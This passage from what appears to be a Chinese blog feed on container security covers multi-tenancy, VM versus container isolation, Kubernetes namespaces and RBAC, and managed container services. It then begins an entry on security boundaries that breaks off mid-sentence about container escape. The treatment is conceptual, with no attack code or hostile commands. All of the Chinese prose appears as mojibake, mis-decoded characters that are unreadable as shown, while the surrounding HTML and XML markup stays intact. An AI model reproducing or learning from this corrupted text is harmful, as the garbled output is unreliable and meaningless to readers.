æ—¶é—´ã€å†…å­˜å’Œå­˜å‚¨ç©ºé—´ç­‰èµ„æºã€‚</p><p><img src="/image/image_33fjLHAnZH.png" alt="å›¾ 1:20 ä¸–çºª 60 å¹´ä»£çš„å¤§å‹æœº" title="å›¾1ï¼š20ä¸–çºª60å¹´ä»£çš„å¤§å‹æœº"></p><p>è¿™å’Œå¦‚ä»Šçš„å…¬æœ‰äº‘å¹¶æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ã€‚å› ä¸ºï¼Œç°åœ¨çš„ç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨äºšé©¬é€Š çš„ AWSã€å¾®è½¯çš„ Azure æˆ–è°·æ­Œçš„äº‘å¹³å°ç­‰å…¬æœ‰äº‘å¹³å°ä¸Šç§Ÿç”¨ CPU æ—¶é—´ã€å†…å­˜å’Œå­˜å‚¨ç©ºé—´ç­‰èµ„æºï¼Œæ­¤å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥ç§Ÿç”¨å…¬æœ‰äº‘çš„å…¶ä»–åŠŸèƒ½å’Œæ‰˜ç®¡æœåŠ¡ã€‚</p><p><img src="/image/image_bui3nXuWHY.png" alt="å›¾ 2ï¼šå•ç§Ÿæˆ· VS å¤šç§Ÿæˆ·" title="å›¾2ï¼šå•ç§Ÿæˆ· VS å¤šç§Ÿæˆ·"></p><p>2006 å¹´ 8 æœˆ 24 æ—¥ï¼Œäºšé©¬é€Šçš„ AWS æ¨å‡ºäº† EC2ï¼Œæ­¤åæˆ‘ä»¬ä¾¿å¯ä»¥ç§Ÿç”¨è¿è¡Œåœ¨ä¸–ç•Œå„åœ°æ•°æ®ä¸­å¿ƒæœºæ¶ä¸Šçš„è™šæ‹Ÿæœºå®ä¾‹äº†ã€‚è™½ç„¶å¾ˆå¤šè™šæ‹Ÿæœºéƒ½è¿è¡Œåœ¨ç‰©ç†æœºä¸Šï¼Œä½†ä½ æ— æ³•çŸ¥é“æ˜¯è°æ“ä½œä½ é‚»è¿‘çš„è™šæ‹Ÿæœºã€‚</p><p><img src="/image/image_o2YkdvUsJC.png" alt="å›¾ 3ï¼šäºšé©¬é€Šçš„ AWS æ¨å‡ºäº† EC2" title="å›¾3ï¼šäºšé©¬é€Šçš„AWSæ¨å‡ºäº†EC2"></p><h2 id="0x02-å…±äº«æœºå™¨"><a href="#0x02-å…±äº«æœºå™¨" class="headerlink" title="0x02 å…±äº«æœºå™¨"></a>0x02 å…±äº«æœºå™¨</h2><p>ä¸€å° Linux ä¸»æœºï¼ˆæˆ–è™šæ‹Ÿæœºï¼‰å¯èƒ½ä¼šè¢«å¤šä¸ªç”¨æˆ·å…±äº«ã€‚è¿™æ ·çš„å¤šç§Ÿæˆ·çš„ä¾‹å­åœ¨å¤§å­¦ä¸­éå¸¸å¸¸è§ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ä»…ç”¨æˆ·ä¹‹é—´å½¼æ­¤ä¸ä¿¡ä»»ï¼Œè¿ç³»ç»Ÿç®¡ç†å‘˜ä¹Ÿä¸ä¿¡ä»»ç”¨æˆ·ã€‚å› æ­¤ï¼Œ<strong>ç®¡ç†å‘˜éœ€è¦åˆ©ç”¨ Linux çš„è®¿é—®æ§åˆ¶æ¥ä¸¥æ ¼é™åˆ¶ç”¨æˆ·çš„è®¿é—®æƒé™</strong>ï¼Œè®©æ¯ä¸ªç”¨æˆ·éƒ½æ‹¥æœ‰ä¸€ä¸ªç™»å½• IDã€‚è¿™æ—¶ï¼Œç”¨æˆ·åªèƒ½æŸ¥çœ‹å¹¶ä¿®æ”¹è‡ªå·±ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä¸èƒ½è®¿é—®å¹¶ä¿®æ”¹ä»–äººç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p><p><img src="/image/image_49HsuwdA6d.png" alt="å›¾ 4ï¼šLinux çš„è®¿é—®æ§åˆ¶" title="å›¾4ï¼šLinux çš„è®¿é—®æ§åˆ¶"></p><p>ä½†æ­£å¦‚æˆ‘ä»¬åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> ä¸­æ‰€è¯´åˆ°çš„é‚£æ ·ï¼š<strong>æ‰€æœ‰è¿è¡Œåœ¨åŒä¸€å®¿ä¸»æœºä¸Šçš„å®¹å™¨éƒ½å…±äº«ä¸€ä¸ªå†…æ ¸ã€‚</strong> å› æ­¤ï¼Œè‹¥è¿™å°æœºå™¨æ­£åœ¨è¿è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹ï¼Œé‚£ä¹ˆä»»ä½•èƒ½æ‰§è¡Œ Docker å‘½ä»¤çš„ç”¨æˆ·éƒ½æ‹¥æœ‰ root è®¿é—®æƒé™ã€‚</p><p><img src="/image/image_P3IgVRrDTC.png" alt="å›¾ 5ï¼šDocker å®¹å™¨ VS è™šæ‹Ÿæœº" title="å›¾5ï¼šDocker å®¹å™¨ VS è™šæ‹Ÿæœº"></p><p>å¾ˆæ˜æ˜¾ï¼Œç³»ç»Ÿç®¡ç†å‘˜ä¸æ„¿æ„å°†è¿™ç§æƒé™æˆäºˆä¸å—ä¿¡ä»»çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œåœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œç”šè‡³åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼Œä½ ä¸å¤ªå¯èƒ½ä¼šçœ‹åˆ°è¿™ç§å…±äº«æœºå™¨çš„æ–¹å¼ã€‚äº‹å®ä¸Šï¼Œå“ªæ€•å½¼æ­¤ä¿¡ä»»çš„ç”¨æˆ·æˆ–ç”¨æˆ·å›¢é˜Ÿé€šå¸¸éƒ½ä¼šä»¥è™šæ‹Ÿæœºçš„å½¢å¼è¿›è¡Œèµ„æºåˆ†é…çš„ã€‚</p><h2 id="0x03-è™šæ‹ŸåŒ–"><a href="#0x03-è™šæ‹ŸåŒ–" class="headerlink" title="0x03 è™šæ‹ŸåŒ–"></a>0x03 è™šæ‹ŸåŒ–</h2><p>ä½†è¯·æ³¨æ„çš„æ˜¯ï¼Œ<strong>è™šæ‹ŸåŒ–å¹¶ä¸ç®—æ˜¯å¤šç§Ÿæˆ·</strong>ï¼šä»<a href="https://en.wikipedia.org/wiki/Multitenancy" title="å®šä¹‰">å®šä¹‰</a>ä¸Šæ¥è¯´ï¼Œå¤šç§Ÿæˆ·æŒ‡çš„æ˜¯ä¸åŒçš„ç”¨æˆ·ç¾¤ä½“å…±äº«ä¸€ä¸ªè½¯ä»¶å®ä¾‹ã€‚è€Œåœ¨è™šæ‹ŸåŒ–çš„ç¯å¢ƒä¸­ï¼Œç”¨æˆ·é€šè¿‡æ— æ³•è®¿é—® hypervisorï¼ˆè™šæ‹Ÿæœºç®¡ç†ç¨‹åºï¼‰æ¥ç®¡ç†è™šæ‹Ÿæœºï¼Œå³ç”¨æˆ·ä¸å…±äº«ä»»ä½•è½¯ä»¶ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè™šæ‹Ÿæœºä¹‹é—´çš„éš”ç¦»æ˜¯éå¸¸å¼ºçš„ï¼Œä½ çš„â€œé‚»å±…â€ä¸å¤ªå¯èƒ½è§‚å¯Ÿæˆ–å¹²æ¶‰åˆ°ä½ åœ¨è™šæ‹Ÿæœºä¸­çš„è¡Œä¸ºã€‚å…³äºå¦‚ä½•å®ç°è¿™ç§éš”ç¦»ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 5 è¯¾ï¼šè™šæ‹Ÿæœºã€‹</strong> ä¸­è¿›è¡Œè®²è§£ã€‚</p><p>ä½†ä¹Ÿå¹¶ä¸æ˜¯è¯´è™šæ‹Ÿæœºä¹‹é—´çš„éš”ç¦»å°±æ˜¯éå¸¸å®Œç¾çš„ï¼Œæ›¾æœ‰ç”¨æˆ·æŠ±æ€¨è¿‡â€œå˜ˆæ‚é‚»å±…â€çš„é—®é¢˜ï¼Œå³ç”±äºæ‚¨ä¸å…¶ä»–ç”¨æˆ·å…±äº«ä¸€å°ç‰©ç†æœºï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½å‡ºç°æ„å¤–çš„æ³¢åŠ¨ã€‚</p><p><img src="/image/image_T5C36QnFhx.png" alt="å›¾ 6ï¼šå˜ˆæ‚é‚»å±…çš„é—®é¢˜" title="å›¾6ï¼šå˜ˆæ‚é‚»å±…çš„é—®é¢˜"></p><p>ä½œä¸ºæœ€æ—©ä¸€æ‰¹ä½¿ç”¨å…¬æœ‰äº‘çš„å‚å•†ï¼ŒNetflix åœ¨ 2010 å¹´ 12 æœˆ 16 æ—¥å‘è¡¨äº†ä¸€ç¯‡åä¸º<a href="https://netflixtechblog.com/5-lessons-weve-learned-using-aws-1f2a28588e4c" title="ã€Š5 Lessons Weâ€™ve Learned Using AWSã€‹">ã€Š5 Lessons Weâ€™ve Learned Using AWSã€‹</a>çš„åšå®¢ã€‚åœ¨è¿™ç¯‡åšå®¢ä¸­ï¼ŒNetflix è¡¨ç¤ºâ€œåˆç§Ÿæ¨¡å¼å¯èƒ½åœ¨å †æ ˆçš„ä»»ä½•å±‚æ¬¡å¼•å…¥ååé‡çš„å˜åŠ¨ã€‚ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„å¯é æ€§å’Œé«˜æ•ˆæ€§ï¼Œæ‚¨è¦ä¹ˆåœ¨å¿…è¦æ—¶æ”¾å¼ƒæ‰€è¿è¡Œçš„å­ä»»åŠ¡ï¼Œè¦ä¹ˆåœ¨ AWS å†…ç®¡ç†æ‚¨çš„èµ„æºä»¥é¿å…åˆç§Ÿã€‚â€</p><p>2016 å¹´ 5 æœˆ 24 æ—¥ï¼ŒDavid Linthicum å‘è¡¨äº†ä¸€ç¯‡åä¸º<a href="https://www.infoworld.com/article/3073503/debunking-the-clouds-noisy-neighbor-myth.html" title="ã€ŠDebunking the cloud&#39;s &#39;noisy neighbor&#39; mythã€‹">ã€ŠDebunking the cloudâ€™s â€˜noisy neighborâ€™ mythã€‹</a>çš„åšå®¢ï¼Œåœ¨è¿™ç¯‡åšå®¢ä¸­ï¼Œä»–è®¤ä¸ºâ€œå˜ˆæ‚é‚»å±…â€å·²ç»ä¸å†æ˜¯ä¸€ä¸ªçœŸæ­£çš„é—®é¢˜äº†ã€‚</p><p>ä¸ä»…å¦‚æ­¤ï¼Œä¹Ÿæœ‰ä¸€äº›<strong>å·²çŸ¥çš„è½¯ä»¶æ¼æ´ä¼šç ´åè™šæ‹Ÿæœºä¹‹é—´çš„å®‰å…¨è¾¹ç•Œ</strong>ã€‚å¯¹äºæ”¿åºœã€é‡‘èæˆ–åŒ»ç–—éƒ¨é—¨ç­‰æœºæ„è€Œè¨€ï¼Œè¿™äº›æ¼æ´æ‰€é€ æˆçš„åæœä¼šååˆ†ä¸¥é‡ï¼Œå› æ­¤å®Œå…¨çš„ç‰©ç†éš”ç¦»æ˜¯ååˆ†æœ‰å¿…è¦çš„ã€‚</p><p><img src="/image/image_aQcE7cQrmW.png" alt="å›¾ 7ï¼šè™šæ‹Ÿæœºé€ƒé€¸æ¼æ´" title="å›¾7ï¼šè™šæ‹Ÿæœºé€ƒé€¸æ¼æ´"></p><p>æˆ‘ä»¬å»ºè®®æ‚¨<strong>æ­å»ºä¸€ä¸ªç§æœ‰äº‘æ¥ç¡®ä¿å·¥ä½œè´Ÿè½½å¯ä»¥è¢«å®Œå…¨åœ°éš”ç¦»èµ·æ¥</strong>ã€‚è¿™ä¸ªç§æœ‰äº‘å¯ä»¥è¿è¡Œåœ¨æ‚¨çš„æ•°æ®ä¸­å¿ƒä¸­ï¼Œä¹Ÿå¯ä»¥è®©æœåŠ¡æä¾›å•†ä»£ä¸ºç®¡ç†ã€‚ä¸ä»…å¦‚æ­¤ï¼Œç§æœ‰äº‘æœ‰æ—¶è¿˜ä¼šé™„å¸¦é¢å¤–çš„å®‰å…¨åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œå¯¹æœ‰æƒè®¿é—®æ•°æ®ä¸­å¿ƒçš„äººå‘˜è¿›è¡Œé¢å¤–çš„èƒŒæ™¯è°ƒæŸ¥ã€‚</p><p>è®¸å¤šäº‘æä¾›å•†ä¼šæä¾›ç‰©ç†æœºæˆ–è™šæ‹Ÿæœºä¸¤ç§ç§Ÿèµæ–¹å¼ã€‚è‹¥æ‚¨ç§Ÿèµçš„æ˜¯è™šæ‹Ÿæœºï¼Œå¯ä»¥è®©ä¾›åº”å•†ä¿è¯ä½ æ˜¯ç‰©ç†æœºä¸Šå”¯ä¸€çš„å®¢æˆ·ï¼›è‹¥æ‚¨ç§Ÿèµçš„æ˜¯ç‰©ç†æœºï¼Œæ‚¨å°†å¾—åˆ°ä¸€ä¸ªè£¸é‡‘å±çš„æœºå™¨ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ä¿è¯æ‚¨æ˜¯ç‰©ç†æœºä¸Šçš„å”¯ä¸€çš„å®¢æˆ·ï¼Œæ‰€ä»¥æ‚¨å°†å…·å¤‡ç‰©ç†æœºä¹‹é—´çš„æ›´å¼ºçš„éš”ç¦»æ€§ï¼Œå¹¶å°†å®Œå…¨é¿å…â€œå˜ˆæ‚é‚»å±…â€çš„é—®é¢˜ã€‚&#x20;</p><p><img src="/image/image_IfcmNVTYGe.png" alt="å›¾ 8ï¼šç§æœ‰äº‘ VS å…¬æœ‰äº‘" title="å›¾8ï¼šç§æœ‰äº‘ VS å…¬æœ‰äº‘"></p><p>ä½†æ— è®ºæ‚¨æ˜¯åœ¨ç§æœ‰äº‘ä¸­ä½¿ç”¨ç‰©ç†æœºè¿˜æ˜¯è™šæ‹Ÿæœºï¼Œè¿˜æ˜¯ä½¿ç”¨è‡ªå·±çš„æœåŠ¡å™¨ï¼Œåªæœ‰æ‚¨è¿è¡Œç€å®¹å™¨ï¼Œæ‚¨éƒ½éœ€è¦è€ƒè™‘å®¹å™¨ä¹‹é—´å¤šç§Ÿæˆ·çš„å®‰å…¨è¾¹ç•Œé—®é¢˜ã€‚</p><h2 id="0x04-å®¹å™¨å¤šç§Ÿæˆ·"><a href="#0x04-å®¹å™¨å¤šç§Ÿæˆ·" class="headerlink" title="0x04 å®¹å™¨å¤šç§Ÿæˆ·"></a>0x04 å®¹å™¨å¤šç§Ÿæˆ·</h2><p>æ­£å¦‚æ‚¨åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> ä¸­æ‰€çœ‹åˆ°çš„é‚£æ ·ï¼š<strong>å®¹å™¨ä¹‹é—´çš„éš”ç¦»æ¯”ä¸ä¸Šè™šæ‹Ÿæœºä¹‹é—´çš„é‚£ä¹ˆå¼ºã€‚</strong></p><p>è™½ç„¶è¿™å–å†³äºæ‚¨çš„é£é™©çŠ¶å†µï¼Œä½†è¯´å®è¯ï¼Œæ‚¨å¯èƒ½ä¹Ÿä¸å¸Œæœ›å’Œä¸ä¿¡ä»»çš„äººåœ¨åŒä¸€å°æœºå™¨ä¸Šä½¿ç”¨å®¹å™¨ã€‚é€€ä¸€ä¸‡æ­¥æ¥è®²ï¼Œå³ä½¿æ‚¨ä¸å®Œå…¨ä¿¡ä»»çš„äººåœ¨åŒä¸€å°æœºå™¨ä¸Šä½¿ç”¨å®¹å™¨ï¼Œä½†æ‚¨åº”è¯¥ä¹Ÿå¸Œæœ›å®¹å™¨ä¹‹é—´ä¸å—å¹²æ‰°æ¥å‡è½»äººä¸ºå¤±è¯¯æ‰€å¸¦æ¥çš„é£é™©ã€‚</p><p>åœ¨ Kubernetes ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Namespaceï¼ˆå‘½åç©ºé—´ï¼‰æ¥ç»†åˆ†é›†ç¾¤æœºå™¨ï¼Œä»¥ä¾›ä¸åŒçš„äººã€å›¢é˜Ÿæˆ–åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚æƒ³è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œåªéœ€ä½¿ç”¨ RBACï¼ˆrole-based access controlï¼ŒåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰å³å¯ã€‚</p><p><img src="/image/image_hb-c2oYnhf.png" alt="å›¾ 9ï¼šå¤šç§Ÿæˆ·æ¨¡å‹çš„å‰§ç¾¤" title="å›¾9ï¼šå¤šç§Ÿæˆ·æ¨¡å‹çš„å‰§ç¾¤"></p><p>ä½†åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¸ä¼šè¯¦ç»†ä»‹ç»å¦‚ä½•é€šè¿‡ RBAC æ¥è¿›è¡Œé…ç½®ï¼Œè¯¦æƒ…è¯·çœ‹ Kubernetes çš„<a href="https://kubernetes.io/zh-cn/docs/concepts/security/multi-tenancy/" title="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</a>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒRBAC ä»…èƒ½æ§åˆ¶æ‚¨å¯ä»¥é€šè¿‡ Kubernetes API è¿›è¡Œçš„æ“ä½œã€‚</p><blockquote><p>ğŸš¥å‹æƒ…æç¤ºï¼ŒNamespace æ˜¯ä¸€ä¸ªå¤šä¹‰è¯ï¼š</p><ol><li>åœ¨ Linux ä¸­ï¼ŒNamespace æ˜¯å¯ä»¥éš”ç¦»è¿›ç¨‹å¯è§èµ„æºçš„åº•å±‚æœºåˆ¶ï¼›</li><li>åœ¨ Kubernetes ä¸­ï¼ŒNamespace å¯ä»¥å¯¹é›†ç¾¤èµ„æºåº”ç”¨ä¸åŒçš„è®¿é—®æ§åˆ¶ï¼›</li></ol><p>æˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> ä¸­è¿›è¡Œè®²è§£ã€‚</p></blockquote><p>ä¸ä»…å¦‚æ­¤ï¼Œè¿è¡Œåœ¨åŒä¸€å®¿ä¸»æœºä¸Šçš„åŒä¸€ä¸ª Pod çš„å®¹å™¨å³ä½¿ä½äºä¸åŒçš„ Namespace ä¸­ï¼Œä½†å…¶å®‰å…¨è¾¹ç•Œçš„ä¿æŠ¤ä»ç„¶ä¾èµ–äºå®¹å™¨çš„éš”ç¦»æœºåˆ¶ï¼Œæ‰€ä»¥å¦‚æœæ”»å‡»è€…å¯ä»¥ä»å®¹å™¨ä¸­é€ƒé€¸åˆ°å®¿ä¸»æœºä¸Šï¼Œå³ä½¿å®¹å™¨å¤„äºä¸åŒçš„ Namespace ä¸­ï¼Œå®ƒä»¬ä»ç„¶æœ‰å¯èƒ½ç›¸äº’å½±å“æˆ–äº’ç›¸å¹²æ‰°ã€‚</p><h2 id="0x05-å®¹å™¨å®ä¾‹"><a href="#0x05-å®¹å™¨å®ä¾‹" class="headerlink" title="0x05 å®¹å™¨å®ä¾‹"></a>0x05 å®¹å™¨å®ä¾‹</h2><p>åƒäºšé©¬é€Šçš„ AWSã€å¾®è½¯çš„ Azure å’Œè°·æ­Œçš„äº‘å¹³å°è¿™æ ·çš„å…¬æœ‰äº‘æä¾›å•†éƒ½æä¾›äº†è®¸å¤šæ‰˜ç®¡æœåŠ¡ï¼Œè®©ç”¨æˆ·æ— éœ€å®‰è£…æˆ–ç®¡ç†å³å¯ç§Ÿç”¨ç»„ä»¶ã€å­˜å‚¨åŠå…¶ä»–ç»„ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼Œäºšé©¬é€Šæä¾›å…³ç³»æ•°æ®åº“æœåŠ¡ï¼ˆRelational Database Serviceï¼ŒRDSï¼‰ï¼Œè‹¥æ‚¨è´­ä¹°äº†è¯¥æœåŠ¡ï¼Œæ‚¨åªéœ€ç®€å•é…ç½®ä¸€ä¸‹å°±å¯ä»¥ä½¿ç”¨ PostgreSQL ç­‰çŸ¥åçš„è½¯ä»¶æ•°æ®åº“ï¼Œè‹¥æ‚¨æƒ³å¤‡ä»½æ•°æ®åªéœ€ç®€å•å‹¾é€‰ä¸€ä¸‹å³å¯ï¼ˆå½“ç„¶è¿˜éœ€è¦æ”¯ä»˜ç›¸å…³è´¹ç”¨ï¼‰ã€‚</p><p>å¦‚ä»Šï¼Œæ‰˜ç®¡æœåŠ¡ä¹Ÿæ‰©å±•åˆ°äº†å®¹å™¨çš„é¢†åŸŸã€‚ä¾‹å¦‚ Azure çš„<a href="https://azure.microsoft.com/en-us/products/container-instances" title="Container Instances">Container Instances</a>å’Œ AWS çš„<a href="https://aws.amazon.com/cn/fargate/" title="Fargate">Fargate</a>å¯ä»¥è®©æ‚¨æ— éœ€è€ƒè™‘åº•å±‚ä¸»æœºï¼ˆæˆ–è™šæ‹Ÿæœºï¼‰å°±å¯ä»¥è½»æ¾åœ°è¿è¡Œå®¹å™¨ã€‚</p><p><img src="/image/image_mtm8pYblM2.png" alt="å›¾ 10ï¼šAWS çš„ Fargate" title="å›¾ 10ï¼šAWSçš„Fargate"></p><p>è¿™æ ·å°±å¯ä»¥å¤§å¤§åœ°å‡è½»ç®¡ç†çš„è´Ÿæ‹…ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥éšæ„åœ°æ‰©å±•éƒ¨ç½²ç¯å¢ƒã€‚ç„¶è€Œï¼Œç†è®ºä¸Šï¼Œæ‚¨çš„å®¹å™¨å®ä¾‹å¯èƒ½ä¼šä¸å…¶ä»–å®¢æˆ·çš„å®¹å™¨å®ä¾‹è¿è¡Œåœ¨åŒä¸€è™šæ‹Ÿæœºä¸Šã€‚å¦‚æœæœ‰ç–‘é—®ï¼Œè¯·å’¨è¯¢ç›¸åº”çš„äº‘æœåŠ¡æä¾›å•†ã€‚</p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>ç°åœ¨ï¼Œæ‚¨å·²ç»äº†è§£äº†æ‚¨çš„éƒ¨ç½²ç¯å¢ƒå¯èƒ½é¢ä¸´çš„è¯¸å¤šæ½œåœ¨å¨èƒï¼Œä½†åœ¨æ¢è®¨å…¶ä»–å†…å®¹ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å­¦ä¹ ä¸€äº›åŸºæœ¬çš„å®‰å…¨åŸåˆ™ã€‚</p><p>è¿™äº›å®‰å…¨åŸåˆ™å¯ä»¥æŒ‡å¯¼æ‚¨å¦‚ä½•åœ¨éƒ¨ç½²ç¯å¢ƒä¸­å¼•å…¥å®‰å…¨å·¥å…·ä¸å®‰å…¨æµç¨‹ã€‚</p><p>ä¸‹æœŸå†è§ï½</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.3 å®‰å…¨è¾¹ç•Œ</title>
    <link href="/2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/"/>
    <url>/2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å‰é¢ï¼Œæˆ‘ä»¬ç”¨å¾ˆé•¿çš„ç¯‡å¹…ä»‹ç»äº†<a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">ã€Š1.2 å®¹å™¨å¨èƒæ¨¡å‹ã€‹</a>ï¼Œå¹¶è¯´æ˜è¿™äº›å¨èƒçš„å…±åŒç›®æ ‡éƒ½æ˜¯ä¸ºäº†çªç ´å®‰å…¨è¾¹ç•Œã€‚</p><p>ä½ ä¸€å®šå¾ˆå¥½å¥‡ï¼šä»€ä¹ˆæ˜¯å®‰å…¨è¾¹ç•Œï¼Œä»¥åŠå¦‚ä½•çªç ´å®‰å…¨è¾¹ç•Œï¼Ÿè¿™å¯¹äºå»ºç«‹å®¹å™¨å®‰å…¨é˜²æŠ¤è§‚åˆæœ‰ä»€ä¹ˆå½±å“å‘¢ï¼Ÿ</p><p>åˆ«æ€¥ï¼Œæˆ‘ä»¬é€ä¸€è¿›è¡Œè®²è§£ã€‚</p><h2 id="0x01-å®‰å…¨è¾¹ç•Œ"><a href="#0x01-å®‰å…¨è¾¹ç•Œ" class="headerlink" title="0x01 å®‰å…¨è¾¹ç•Œ"></a>0x01 å®‰å…¨è¾¹ç•Œ</h2><p>å®‰å…¨è¾¹ç•Œï¼ˆä¿¡ä»»è¾¹ç•Œï¼‰åœ¨ç³»ç»Ÿä¸­æ— å¤„ä¸åœ¨ï¼Œè‹¥æ‚¨æƒ³åœ¨å„ç§ä¸åŒçš„å®‰å…¨è¾¹ç•Œä¹‹é—´â€œåå¤æ¨ªè·³â€ï¼Œæ‚¨å¾—éœ€è¦å„ç§ä¸åŒçš„æƒé™åˆé›†ã€‚</p><p>é‚£å®‰å…¨è¾¹ç•Œæ˜¯æ€ä¹ˆè®¾ç½®çš„å‘¢ï¼Ÿæœ‰çš„æ˜¯é€šè¿‡ç®¡ç†æ–¹å¼è®¾ç½®çš„ï¼Œä¾‹å¦‚ï¼šåœ¨ Linux ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„ç»„æ¥æŒ‡å®šç”¨æˆ·å¯ä»¥è®¿é—®å“ªäº›å®‰å…¨è¾¹ç•Œçš„æ–‡ä»¶ã€‚</p><p><img src="/image/image_UoaYFFHbqn.png" alt="å›¾ 1ï¼šLinux ç”¨æˆ·ä¸æƒé™" title="å›¾1ï¼šLinuxç”¨æˆ·ä¸æƒé™"></p><p>å¦‚æœæ‚¨å¯¹ Linux çš„æ–‡ä»¶æƒé™ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 2 è¯¾ï¼šLinux ç³»ç»Ÿè°ƒç”¨ã€æƒé™å’Œ Capabilitiesã€‹</strong> ä¸­ä¸ºæ‚¨è¿›è¡Œç®€å•çš„å›é¡¾ã€‚</p><p><strong>åœ¨äº‘åŸç”Ÿçš„ä¸–ç•Œé‡Œï¼Œå®¹å™¨å°±æ˜¯å®‰å…¨è¾¹ç•Œ</strong>ï¼Œå®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºå°±åº”è¯¥åªåœ¨å®¹å™¨ä¸­è¿è¡Œï¼Œé™¤éæ‚¨æ˜ç¡®èµ‹äºˆäº†åº”ç”¨ç¨‹åºè·¨è¶Šå®‰å…¨è¾¹ç•Œçš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æŒ‚è½½å·çš„æ–¹å¼ï¼‰ï¼Œé‚£ä¹ˆå®ƒä¸èƒ½ä¹Ÿä¸åº”è¯¥è®¿é—®å®¹å™¨ä¹‹å¤–çš„æ•°æ®ä»£ç ã€‚</p><h2 id="0x02-çªç ´å®‰å…¨è¾¹ç•Œ"><a href="#0x02-çªç ´å®‰å…¨è¾¹ç•Œ" class="headerlink" title="0x02 çªç ´å®‰å…¨è¾¹ç•Œ"></a>0x02 çªç ´å®‰å…¨è¾¹ç•Œ</h2><p>æ”»å‡»è€…ä¸ä»–çš„ç›®æ ‡ä¹‹é—´å­˜åœ¨è¶Šå¤šçš„å®‰å…¨è¾¹ç•Œï¼Œä»–å°±è¶Šæ— æ³•è·å–è¯¥ç›®æ ‡ï¼Œè¿™é‡Œçš„ç›®æ ‡å¯ä»¥æ˜¯æ‚¨çš„ç”¨æˆ·æ•°æ®ã€‚ä½†æ­£å¦‚å‰é¢æˆ‘ä»¬æ‰€å­¦ä¹ çš„<a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">ã€Š1.2 å®¹å™¨å¨èƒæ¨¡å‹ã€‹</a>æ‰€æè¿°çš„é‚£æ ·ï¼Œæ”»å‡»è€…å¯ä»¥å°†æ”»å‡»å‘é‡ä¸²è”èµ·æ¥ï¼Œä»¥çªç ´å¤šä¸ªå®‰å…¨è¾¹ç•Œã€‚ä¾‹å¦‚ï¼š</p><p><img src="/image/image_HDzEjQF2rM.png" alt="å›¾ 2ï¼šçªç ´å®‰å…¨è¾¹ç•Œçš„æµç¨‹" title="å›¾2ï¼šçªç ´å®‰å…¨è¾¹ç•Œçš„æµç¨‹"></p><ol><li>è‹¥æ”»å‡»è€…å‘ç°åº”ç”¨ç¨‹åºä¸­çš„ä¾èµ–å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆä»–ä»¬å¯ä»¥åœ¨å®¹å™¨ä¸­è¿œç¨‹æ‰§è¡Œä»£ç ã€‚</li><li>å¦‚æœå®¹å™¨ä¸­æ²¡æœ‰å¯ä»¥ç›´æ¥è®¿é—®çš„æœ‰ä»·å€¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥ç¦»å¼€å®¹å™¨ï¼ˆæ— 